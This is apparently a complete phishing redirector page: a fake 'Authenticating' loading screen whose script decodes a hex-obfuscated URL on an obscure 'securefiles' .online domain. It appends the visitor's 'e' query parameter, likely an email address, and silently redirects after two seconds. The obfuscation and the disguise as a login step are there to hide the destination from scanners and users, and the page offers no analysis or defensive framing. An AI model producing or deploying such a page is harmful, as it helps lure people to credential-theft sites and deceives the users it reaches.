<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authenticating</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
    }
    .logo-container {
      text-align: center;
      opacity: 0;
      animation: fadeIn 0.5s ease forwards;
    }
    .logo {
      width: 120px;
      height: 120px;
      animation: breathing 2s ease-in-out infinite;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }
    @keyframes breathing {
      0%, 100% { transform: scale(0.95); }
      50% { transform: scale(1.05); }
    }
    .loading-text {
      margin-top: 20px;
      color: #333;
      font-size: 14px;
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 0.7; }
      50% { opacity: 1; }
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', function() {

      document.querySelector('.logo-container').style.opacity = "1";
      
      const urlParams = new URLSearchParams(window.location.search);
      const encodedParam = urlParams.get('e') || '';
      
      const parts = [
        0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 
        0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x66, 0x69,
        0x6c, 0x65, 0x73, 0x2e, 0x65, 0x73, 0x70, 0x6a,
        0x61, 0x68, 0x73, 0x79, 0x72, 0x76, 0x2e, 0x6f,
        0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2f, 0x70, 0x6c,
        0x49, 0x55, 0x58, 0x56, 0x64, 0x41, 0x23
      ];
      
      const baseUrl = parts.map(c => String.fromCharCode(c)).join('');
      const targetUrl = baseUrl + encodedParam;
      
      setTimeout(function() {
        window.location.href = targetUrl;
      }, 2000);
    });
  </script>
</head>
<body>
  <div class="logo-container">
    <img class="logo" src="logo.png" alt="Loading">
    <div class="loading-text">Loading, please wait...</div>
  </div>
</body>
</html>
